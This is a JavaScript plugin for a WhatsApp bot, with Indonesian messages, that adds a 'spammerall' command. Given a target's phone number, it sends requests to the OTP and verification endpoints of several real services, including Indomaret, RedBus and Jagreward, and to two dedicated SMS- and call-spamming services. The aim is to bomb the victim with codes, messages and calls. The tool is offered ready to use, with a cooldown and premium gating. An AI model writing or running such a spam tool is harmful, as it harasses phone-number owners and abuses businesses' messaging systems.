const axios = require ("axios")
const fetch = require('node-fetch')

let handler = async (m, { conn, args, text, usedPrefix }) => {
  let __timers = (new Date - db.data.users[m.sender].spammer)
  let _timers = (86400000 - __timers)
  let timers = clockString(_timers)
  if (new Date - db.data.users[m.sender].spammer > 86400000) {
  db.data.users[m.sender].spammer = new Date * 1
  if (!args[0]) throw `Contoh Penggunaan\n${usedPrefix}spamsms 8xxxxxxxx`
  // let nomor = text.replace(/[^0-9]/gi, '').slice(2)
  // if (!nomor.startsWith('')) throw `Contoh Penggunaan\n${usedPrefix}spamsms 8xxxxxxxx`
  m.reply('_*Tunggu permintaan anda sedang diproses.....*_')
  let indomart = await fetchJson(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0${args[0]}`)
  let redbus = await fetchJson(`https://m.redbus.id/api/getOtp?number=${args[0]}&cc=62&whatsAppOpted=true&disableOtpFlow=undefined`)
  let spamotp = await fetchJson(`https://app-spamotp.herokuapp.com/api/spamsms?phone=${args[0]}`)
  let jagreward = await fetchJson(`https://id.jagreward.com/member/verify-mobile/0${args[0]}`)
  let spamcallh = await fetchJson(`https://spamertelpon.herokuapp.com/?nohp=0${args[0]}`)
  let spsms = `_*Aine From ProgramCall*_
_Berhasil menelpon anda!_

_*Aine From Jagreward*_
_Berhasil menelpon anda!_

_*Aine From Indomaret*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From MATAHARI*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From OLX*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From Fave*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From PAYFAZZ*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From BukuWarung*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From DANACINTA*_
_Berhasil mengirim pesan SMS OTP ke anda!_

_*Aine From RedBus*_
_Berhasil mengirim pesan VIA WHATSAPP/SMS OTP ke anda!_

Delay dalam waktu sekitar 24 jam..`
   let img = 'https://telegra.ph/file/1d23bc78669b4559573f3.jpg'
  // conn.reply(anu)
  // conn.reply(m.chat, `${spsms}`.trim(), m)
  conn.sendFile(m.chat, img, 'otp.png', `${spsms}`.trim(), m)
  } else conn.reply(m.chat, `*Delay..*\n*Menunggu sekitar ${timers} Untuk spam..*`, m)
}

handler.help = ['spammerall <nomor>']
handler.tags = ['tools']
handler.command = /^(spammerall)$/i

handler.limit = true
handler.premium = true
handler.group = true

module.exports = handler

function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

const fetchJson = (url, options) => new Promise(async (resolve, reject) => {
    fetch(url, options)
        .then(response => response.json())
        .then(json => {
            // console.log(json)
            resolve(json)
        })
        .catch((err) => {
            reject(err)
        })
})
